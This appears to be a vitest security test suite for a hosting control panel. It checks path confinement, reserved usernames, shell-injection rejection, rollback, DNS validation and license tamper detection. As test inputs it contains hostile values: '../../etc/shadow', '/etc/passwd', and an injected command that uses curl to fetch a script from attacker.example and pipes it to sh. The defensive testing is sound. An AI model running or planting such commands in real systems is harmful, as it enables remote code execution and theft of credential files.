import { describe, expect, it } from 'vitest';
import {
  LinuxUsernameSchema,
  validateAccountHomeConfinement,
  validateStrictDnsRecord,
} from '@garvix/validation';
import { MockLinuxAgentAdapter } from '@garvix/local-panel-api';
import {
  generateCloudLicenseSigningKeyPair,
  issueSignedLicenseEnvelope,
  verifyLicenseLocally,
} from '@garvix/cloud-api';

describe('Security Suite — Path Traversal, Symlink Escapes, Command Injection & Agent Rollback', () => {
  it('blocks path traversal (..), leading slashes, null bytes, and symlink escapes outside /home/<user>', () => {
    expect(
      validateAccountHomeConfinement('acmehost', '../../etc/shadow').valid
    ).toBe(false);

    expect(
      validateAccountHomeConfinement('acmehost', '/etc/passwd').valid
    ).toBe(false);

    expect(
      validateAccountHomeConfinement('acmehost', 'public_html/index.php\0.jpg').valid
    ).toBe(false);

    // Simulated symlink inside /home/acmehost/public_html/leak pointing to /etc/nginx/nginx.conf
    const symlinkEscape = validateAccountHomeConfinement(
      'acmehost',
      'public_html/leak',
      '/etc/nginx/nginx.conf'
    );
    expect(symlinkEscape.valid).toBe(false);
    expect(symlinkEscape.reason).toContain('Symlink or path escape detected');

    // Valid confined path
    const safePath = validateAccountHomeConfinement(
      'acmehost',
      'public_html/index.php',
      '/home/acmehost/public_html/index.php'
    );
    expect(safePath.valid).toBe(true);
  });

  it('blocks reserved system usernames (root, postgres, nginx, postfix, garvix-agent)', () => {
    for (const reserved of ['root', 'postgres', 'nginx', 'postfix', 'dovecot', 'garvix-agent']) {
      expect(LinuxUsernameSchema.safeParse(reserved).success).toBe(false);
    }
    expect(LinuxUsernameSchema.safeParse('tenant_alpha01').success).toBe(true);
  });

  it('rejects shell metacharacters and command injection payloads in the Linux Agent adapter', () => {
    const agent = new MockLinuxAgentAdapter();

    const injectionAttempt = agent.execute({
      requestId: 'req_sec_01',
      idempotencyKey: 'idem_sec_01',
      operation: 'CreateHostingAccount',
      actorUserId: 'usr_admin',
      actorRole: 'SERVER_ADMIN',
      tenantOrganizationId: 'org_alpha',
      targetAccountId: 'acc_1',
      dryRun: false,
      params: {
        linuxUsername: 'validuser',
        relativePath: 'public_html; curl http://attacker.example/shell.sh | sh',
      },
    });

    expect(injectionAttempt.status).toBe('REJECTED');
    expect(injectionAttempt.error?.code).toBe('SHELL_METACHARACTER_REJECTED');
  });

  it('performs automatic transactional rollback and records audit logs when post-execution validation fails', () => {
    const agent = new MockLinuxAgentAdapter();

    const failedValidationResult = agent.execute(
      {
        requestId: 'req_rollback_01',
        idempotencyKey: 'idem_rollback_01',
        operation: 'CreateHostingAccount',
        actorUserId: 'usr_admin',
        actorRole: 'SERVER_ADMIN',
        tenantOrganizationId: 'org_alpha',
        targetAccountId: 'acc_1',
        dryRun: false,
        params: {
          linuxUsername: 'acmeweb',
          relativePath: 'public_html',
        },
      },
      { simulateValidationFailure: true }
    );

    expect(failedValidationResult.status).toBe('FAILED_ROLLED_BACK');
    expect(failedValidationResult.snapshotId).toBe('snap_req_rollback_01');
    expect(failedValidationResult.error?.rollbackVerified).toBe(true);
    expect(agent.getAuditTrail()).toHaveLength(1);
    expect(agent.getAuditTrail()[0]?.status).toBe('FAILED_ROLLED_BACK');
  });

  it('validates DNS records strictly and blocks zone file injection or CNAME at zone apex', () => {
    expect(
      validateStrictDnsRecord({
        name: '@',
        type: 'CNAME',
        content: 'target.example.com',
        ttl: 3600,
        priority: null,
      }).valid
    ).toBe(false);

    expect(
      validateStrictDnsRecord({
        name: 'www',
        type: 'A',
        content: '999.999.999.999',
        ttl: 3600,
        priority: null,
      }).valid
    ).toBe(false);

    expect(
      validateStrictDnsRecord({
        name: 'txt-inj',
        type: 'TXT',
        content: 'v=spf1; IN A 1.2.3.4',
        ttl: 3600,
        priority: null,
      }).valid
    ).toBe(false);

    expect(
      validateStrictDnsRecord({
        name: '@',
        type: 'A',
        content: '198.51.100.42',
        ttl: 3600,
        priority: null,
      }).valid
    ).toBe(true);
  });

  it('rejects tampered Ed25519 license payloads and mismatched hardware fingerprints', () => {
    const keyPair = generateCloudLicenseSigningKeyPair('gv_sec_k1');
    const envelope = issueSignedLicenseEnvelope(
      {
        licenseId: 'lic_sec_1',
        organizationId: 'org_alpha',
        serverId: 'srv_1',
        hardwareFingerprintHash: 'sha256:legitimate_hw_hash',
        primaryIpv4Hint: '198.51.100.10',
        tier: 'MONTHLY',
        maxHostingAccounts: 10,
        features: ['SSL'],
        issuedAtIso: '2026-10-01T00:00:00.000Z',
        expiresAtIso: '2026-11-01T00:00:00.000Z',
        offlineGraceHours: 72,
        minCompatibleVersion: '1.0.0',
        maxCompatibleVersion: '1.99.99',
      },
      keyPair.privateKeyPem,
      keyPair.publicKeyId
    );

    // Tamper with payload to escalate maxHostingAccounts to UNLIMITED
    const tamperedClaims = JSON.parse(
      Buffer.from(envelope.payloadBase64Url, 'base64url').toString('utf8')
    );
    tamperedClaims.maxHostingAccounts = 'UNLIMITED';
    const tamperedEnvelope = {
      ...envelope,
      payloadBase64Url: Buffer.from(JSON.stringify(tamperedClaims), 'utf8').toString('base64url'),
    };

    const tamperedCheck = verifyLicenseLocally({
      envelope: tamperedEnvelope,
      embeddedPublicKeyPem: keyPair.publicKeyPem,
      currentHardwareFingerprintHash: 'sha256:legitimate_hw_hash',
      currentPrimaryIpv4: '198.51.100.10',
      lastCloudSyncAtIso: '2026-10-19T00:00:00.000Z',
    });

    expect(tamperedCheck.validSignature).toBe(false);
    expect(tamperedCheck.operationalMode).toBe('REVOKED');
    expect(tamperedCheck.allowNewProvisioning).toBe(false);
    // Even when revoked/tampered, existing hosted websites & data export are never destructively wiped
    expect(tamperedCheck.allowExistingWebsitesAndEmail).toBe(true);
  });
});
